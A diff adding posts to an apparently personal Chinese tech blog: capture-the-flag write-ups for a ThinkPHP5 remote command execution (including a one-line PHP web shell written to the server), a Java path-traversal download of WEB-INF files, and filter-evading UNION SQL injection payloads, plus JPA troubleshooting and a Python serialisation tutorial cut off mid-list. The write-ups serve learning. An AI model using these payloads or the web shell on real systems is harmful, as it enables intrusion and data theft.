@@ -62,6 +62,433 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-BUUCTF-old-hack" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/26/BUUCTF-old-hack/" class="article-date">
+  <time datetime="2020-04-26T11:25:37.220Z" itemprop="datePublished">2020-04-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#[BUUCTF] old hack</p>
+<hr>
+<p><strong>1.打开页面，获取提示信息</strong></p>
+<p>打开页面，页面提示powered by Thinkphp。说明可能和thinkphp框架有关。也确实如此，这里用到了thinkphp5的远程命令执行漏洞。在用这个thinkphp的漏洞前，先了解一下有关thinkphp的一些基础知识:</p>
+<p>thinkphp是一个用来简化企业应用开发和敏捷WEB应用的php框架。thinkphp包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件。简而言之，thinkphp是一个用来简化php网站开发的框架，让开发者更注重于业务逻辑。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175644953.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<hr>
+<p><strong>2.thinkphp5远程命令执行漏洞</strong></p>
+<p>漏洞描述：由于thinkphp对框架中的核心Requests类的方法method方法提供了表单请求伪造，该功能利用 <code>$_POST[&#39;_method&#39;]</code>来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置<code>$_POST[&#39;_method&#39;]=&#39;__construct&#39;</code>而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。</p>
+<p>使用kali查找一下漏洞的利用方法：</p>
+<p>1.<code>searchsploit thinkphp</code> 查找thinkphp相关的漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175658860.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>2.<code>cd usr/share/exploitdb/exploits/php/webapp/46150.txt</code> 查看漏洞的利用方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175709668.JPG" alt></p>
+<p>3.post传参，发现页面提示flag在路径下存放</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175926466.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175850451.JPG" alt></p>
+<p>4.把<code>ls /</code>换成<code>cat /flag</code>,获得最后的flag</p>
+<p>5.提交flag</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175945856.JPG" alt></h2><p><strong>3.漏洞复现</strong></p>
+<p>下载thinkphp5.0.22: <a href="http://www.thinkphp.cn/donate/download/id/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1260.html</a></p>
+<p>通过phpstudy搭建环境，解压文件到WWW目录下</p>
+<p>访问：localhost/thinkphp5.0.22/public</p>
+<p>post传参 这里可以换成<code>echo 233</code>测试一下</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175958959.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>写入shell 换成 <code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</code></p>
+<p>可以看到成功写入shell，用菜刀连接试试。能连上，说明写入shell成功了</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426180016596.JPG" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/26/BUUCTF-old-hack/" data-id="ck9gz156100019sv9f6w9n7e7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-RoarCTF2019-easy-Java" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/26/RoarCTF2019-easy-Java/" class="article-date">
+  <time datetime="2020-04-26T11:21:58.538Z" itemprop="datePublished">2020-04-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Roar-CTF-2019-easy-Java"><a href="#Roar-CTF-2019-easy-Java" class="headerlink" title="[Roar CTF  2019] easy Java"></a>[Roar CTF  2019] easy Java</h1><hr>
+<p><strong>1.尝试登录</strong></p>
+<p>打开实例，首先出现了一个登录页面。考虑账号用admin，密码先尝试几个登录。提示wrong password，但是，这个页面的密码可以直接用暴力破解的方法得到。得出来用户名是admin，密码是admin888。</p>
+<p>登录过去发现页面”flag is not here”,页面没有啥有用的信息，回到登录页面，发现有个help链接。进去，发先报错 “java.io.FileNotFoundException:{help.docx}”,意思是找不到help.docx这个文件。感觉这个提示没啥用，但既然提示这个文件，而且页面的URL是Download?file=help.docx。那就尝试下载help.docx这个文件。但是不知为何，get请求无法下载文件，只能通过post请求下载。</p>
+<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175300859.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></h2><p><strong>2.寻找正确的文件</strong></p>
+<p>打开help.docx结果没有什么有用的信息，不过我们可以判断这里是有文件包含漏洞的，这里需要找到合适文件。题目名已经告诉我们，这里可能和Java有关。这里就要用到Java web的有关知识了，这里需要了解一下Java web的文件结构：</p>
+<pre><code>src/main/java: 这个目录一般是存放web项目的Java源文件的
+src/main/resource: 这个目录一般是存放相关的配置文件
+src/main/webapp: 这个目录一般是和web应用相关的
+webapp下的文件目录是容易出现安全问题的
+/WEB-INF/web.xml: Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 
+/WEB-INF/classes/：含了站点所有用的 class 文件(即编译后的Java文件)，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件</code></pre><p>这里就要尝试打开web.xml文件了。web.xml是我们需要研究的文件。之所以会发生安全漏洞就是因为如果在web.xml文件中有某个文件的相关映射的话，我们就可以直接在页面访问这个文件，就类似于文件包含了。从而发生安全漏洞。</p>
+<hr>
+<p><strong>3找到flag</strong></p>
+<p>通过post请求下载web.xml文件 <code>payload：Download?filename=/WEB-INF/web.xml</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175514555.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+ xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+ xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+ version=&quot;4.0&quot;&gt;
+
+&lt;welcome-file-list&gt;
+&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
+&lt;/welcome-file-list&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;/web-app&gt;</code></pre><p>可以看到有个servlet（运行在web服务器或应用服务器上的程序）为FlagController,这个是可能有flag的类，存放于com.wm.ctf包下。那么尝试下载这个类。构造payload：<code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>(直接这样是不行，因为无法get请求。需要在Download页面下post请求传filename=/WEB-INF/classes/com/wm/ctf/FlagController.class)</p>
+<p>打开class，发现一串有点像Base64编码的字符串</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426175527989.JPG" alt></p>
+<p>尝试一下Basse64解码，成功的得到了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/2020042617553933.JPG" alt></p>
+<p>提交flag</p>
+<p>这个题目其实结合了源码泄露，和文件包含以及Java web的基础知识。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/26/RoarCTF2019-easy-Java/" data-id="ck9gz156500029sv9e38zuunc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SWPUCTF2019 web1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/25/SWPUCTF2019 web1/" class="article-date">
+  <time datetime="2020-04-25T10:17:34.015Z" itemprop="datePublished">2020-04-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#[SWPUCTF 2019] web1</p>
+<hr>
+<p><strong>1.登录页面</strong></p>
+<p>进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的WP，学到了sql注入的新姿势，原来这是利用了无列名注入。</p>
+<hr>
+<p><strong>2.构造payload</strong></p>
+<p>随便试了几个payload,发现order,and,or都被过滤了。空格也被过滤了。。。但是空格可以用/**/代替。and也可以用&amp;&amp;代替。那么先试试有几个字段。由于order被过滤了，没法用order by子句判断目标表的列数了。这里我就逐渐增加字段数，这样慢慢的发现竟然有22个字段,并且第2，3列是显示列</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来就是老套路，查表，查列，查数据了。</p>
+<p>首先爆数据库名，数据库名为web1</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来爆表名</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;web1&apos;/**/,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>但是information被过滤了，实际上是or被过滤了，导致order，or，information这些字都被过滤了。那怎么查到表名？在网上搜索才知道mysql在5.7版本之后还有一个sys系统表sys.schema_auto_increment_columns，作用和information_schema是相似的。</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns /**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>但是试了一下报错,页面说sys.schema_auto_increment_columns这个表不存在。但是根据刚才试列数是页面报的错才知道mysql.innodb_table_stats这个表也可以用，也类似于information_schema,这是这个表的详细使用信息：</p>
+<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
+<p>那么重新构造payload：</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>查到有两个表ads,users。ads应该是和广告有关的，这里先试试users表</p>
+<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>这里用到了子查询，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/25/SWPUCTF2019 web1/" data-id="ck9gz156700039sv9xaleejrc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-JPA初学问题总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/13/JPA初学问题总结/" class="article-date">
+  <time datetime="2020-04-13T13:04:54.234Z" itemprop="datePublished">2020-04-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JPA初学问题总结"><a href="#JPA初学问题总结" class="headerlink" title="JPA初学问题总结"></a>JPA初学问题总结</h1><hr>
+<p><strong>1.IDE无法解析junit和spring framework-test</strong></p>
+<p>  创建实体DAO的测试类时，按往常一样导入junit和spring framework-test的依赖。但是发现在测试类中导入相关的类时发现eclipse报错’cannot reslove …’，一开始纳闷导入的类都是正确的，为什么eclipse无法解析？原来是需要如下这样在项目的pom.xml文件中导入依赖</p>
+<!-- ============== test begin ============== -->
+<pre><code>&lt;dependency&gt;&lt;!-- JUnit单元测试框架 --&gt;
+    &lt;groupId&gt;junit&lt;/groupId&gt;
+    &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;version&gt;4.12&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-test --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-test&lt;/artifactId&gt;
+    &lt;version&gt;5.1.6.RELEASE&lt;/version&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+
+&lt;!-- ============== test end ============== --&gt;</code></pre><hr>
+<p><strong>2.junit test运行时报错</strong></p>
+<p>报错信息：</p>
+<pre><code>Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:123) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.afterPropertiesSet(AbstractEntityManagerFactoryBean.java:378) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.afterPropertiesSet(LocalContainerEntityManagerFactoryBean.java:341) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1855) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1792) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) ~[spring-beans-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) ~[spring-context-5.2.4.RELEASE.jar:5.2.4.RELEASE]
+...
+...25 more
+Caused by: org.hibernate.HibernateException: Unable to instantiate default tuplizer [org.hibernate.tuple.entity.PojoEntityTuplizer]
+at org.hibernate.tuple.entity.EntityTuplizerFactory.constructTuplizer(EntityTuplizerFactory.java:91) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.tuple.entity.EntityTuplizerFactory.constructDefaultTuplizer(EntityTuplizerFactory.java:116) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.tuple.entity.EntityMetamodel.&lt;init&gt;(EntityMetamodel.java:382) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.entity.AbstractEntityPersister.&lt;init&gt;(AbstractEntityPersister.java:519) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.entity.SingleTableEntityPersister.&lt;init&gt;(SingleTableEntityPersister.java:124) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?]
+at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[?:?]
+at jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:?]
+at java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:500) ~[?:?]
+at java.lang.reflect.Constructor.newInstance(Constructor.java:481) ~[?:?]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:96) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.persister.internal.PersisterFactoryImpl.createEntityPersister(PersisterFactoryImpl.java:77) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.metamodel.internal.MetamodelImpl.initialize(MetamodelImpl.java:128) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.internal.SessionFactoryImpl.&lt;init&gt;(SessionFactoryImpl.java:300) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.boot.internal.SessionFactoryBuilderImpl.build(SessionFactoryBuilderImpl.java:460) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.hibernate.jpa.boot.internal.EntityManagerFactoryBuilderImpl.build(EntityManagerFactoryBuilderImpl.java:892) ~[hibernate-core-5.2.16.Final.jar:5.2.16.Final]
+at org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider.createContainerEntityManagerFactory(SpringHibernateJpaPersistenceProvider.java:58) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean.createNativeEntityManagerFactory(LocalContainerEntityManagerFactoryBean.java:365) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+at org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.buildNativeEntityManagerFactory(AbstractEntityManagerFactoryBean.java:391) ~[spring-orm-5.2.5.RELEASE.jar:5.2.5.RELEASE]
+...
+... 25 more
+...</code></pre><p>最初还提示’org.springframework.beans.factory.BeanCreationException:’，我一开始以为是配置文件applicationContextTest-resources.xml的问题。一直在找是不是bean定义的问题。但是怎么改都这样。查了网上的资料才知道有可能不是配置文件的问题。’Caused by: org.hibernate.MappingException: Could not get constructor for org.hibernate.persister.entity.SingleTableEntityPersister’可能是有三种原因导致的。</p>
+<p>1.实体类属性没有get,set方法，或者get，set方法的格式不严谨</p>
+<p>右键source，选择’generate getter and setter’生成属性的get,set方法。但是检查了一下，发现我都是eclipse自动生成的get，set方法。格式是严格按照要求的，属性也都有get，set方法。但是每次运行测试类之前最好检查一下实体类属性的get,set方法</p>
+<p>2.没有导入需要的jar文件</p>
+<p>这里需要导入java-assist的jar文件，在pom中添加这个</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+    &lt;version&gt;3.23.1-GA&lt;/version&gt;
+&lt;/dependency&gt;</code></pre><p>导入这个jar包后发现，不报错，说明需要导入这个jar包。</p>
+<p>3.实体属性名和映射文件的property name不一致</p>
+<p>这个的解决方法就是让实体属性名和映射文件property name一致就行了。</p>
+<hr>
+<p><strong>3.javax.net.ssl.SSLException</strong></p>
+<p>在stackflow上看到了解决方法，在jdbc配置文件（我这里是jdbc.properties）给url添加一个参数useSSL=false,不再报错。</p>
+<hr>
+<p>参考链接：<a href="https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype" target="_blank" rel="noopener">https://stackoverflow.com/questions/18042247/could-not-get-constructor-for-org-hibernate-persister-entity-singletableentitype</a></p>
+<p><a href="https://blog.51cto.com/zero01/2294152" target="_blank" rel="noopener">https://blog.51cto.com/zero01/2294152</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/13/JPA初学问题总结/" data-id="ck9gz156q000f9sv9iy0m2c7j" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python序列化及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/11/python序列化及反序列化/" class="article-date">
+  <time datetime="2020-04-11T08:12:38.980Z" itemprop="datePublished">2020-04-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Python序列化及反序列化"><a href="#Python序列化及反序列化" class="headerlink" title="Python序列化及反序列化"></a>Python序列化及反序列化</h1><hr>
+<p><strong>1.为什么要使用序列化？</strong></p>
+<p>  由于TCP/IP协议不能够传输对象，我们需要将对象转换为字节数组来传输。所以对象序列化后结果就是字节数组。当通信双方进行通讯时，发送方通过序列化将对象转化为可传输的二进制字节序列。而接受方则通过反序列化将二进制字节序列转换为对象。</p>
+<p><strong>2.什么是序列化及反序列化？</strong></p>
+<p>  通俗地讲，序列化就是将内存中的变量转换成可存储的，可传输的二进制序列。而反序列化就是二进制序列重新转换成对象。在python中序列化可以理解为将对象转换成json字符串，而反序列化则是将json字符串转换成对象。序列化在python中被称作pickling，反之，反序列化就称做unpickling。python为我们提供了json和pickle库来执行序列化及反序列化的操作。</p>
+<p><strong>3.pickle模块</strong></p>
+<p>  pickle模块只限于通信双方都是python的情况。和json比较，pickle模块可以持久化用户自定义的对象，而json只限于python的基本类型。python的pickle模块提供了几个函数：</p>
+<pre><code>dump 将对象序列化，存在文件中
+dumps 将对象序列化 但不存入文件而是返回bytes数组
+load 文件中读取的数据反序列化
+loads bytes数组反序列化</code></pre><p>示例：</p>
+<p>首先要导入pickle模块</p>
+<pre><code>import pickle
+list=&apos;a b c h j k&apos;.split(&apos; &apos;)
+data=pickle.dumps(list)
+print(&apos;序列化{}&apos;.format(data))
+data2=pickle.loads(data)
+print(&apos;反序列化{}&apos;.format(data2))</code></pre><p>输出：</p>
+<pre><code>序列化b&apos;\x80\x03]q\x00(X\x01\x00\x00\x00aq\x01X\x01\x00\x00\x00bq\x02X\x01\x00\x00\x00cq\x03X\x01\x00\x00\x00hq\x04X\x01\x00\x00\x00jq\x05X\x01\x00\x00\x00kq\x06e.&apos;
+反序列化[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>第一个示例是序列化为了bytes 我们也可以利用dump方法直接写入文件。得到file like object。不过pickle是以二进制的形式处理文件，所以读写文件要用’wb’和’rb’。</p>
+<pre><code>import pickle
+d=dict(name=&quot;张三&quot;,age=16,grade=&quot;五年级&quot;,score=&quot;90&quot;)
+with open(&quot;json_pickle.txt&quot;,&apos;wb&apos;) as f:
+    pickle.dump(d,f)
+with open(&quot;json_pickle.txt&quot;,&apos;rb&apos;) as f:
+    d2=pickle.load(f)
+print(d2)</code></pre><p>对自定义对象进行序列化：</p>
+<pre><code>import pickle
+class car:
+
+
+
+    def __init__(self,brand):
+           self.brand=brand
+       def show(self):
+        print(&quot;the car belongs to&quot;+self.brand)
+with open(&apos;json_pickle.txt&apos;,&apos;wb&apos;) as f:
+s=car(&apos;法拉利&apos;)
+s.show()
+pickle.dump(s,f)
+with open(&apos;json_pickle.txt&apos;,&apos;rb&apos;) as f:
+    s2=pickle.load(f)
+    s2.show()</code></pre><p>输出：</p>
+<pre><code>the car belongs to法拉利
+the car belongs to法拉利</code></pre><p><strong>4.json模块</strong></p>
+<p>怎么在不同的编程语言之间传递对象？这里就用到了json（javascript object notation）JSON表示出来就是一个字符串(特殊格式），可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。</p>
+<p>json的数据类型可以是双引号引起来的字符串，数值，true和false，null（None），对象（字典），数组（列表）。其中null相当python的none，ture，false相当python的True，False。</p>
+<p>json常用函数：</p>
+<pre><code>dumps json 编码 
+dump json 编码并存入文件
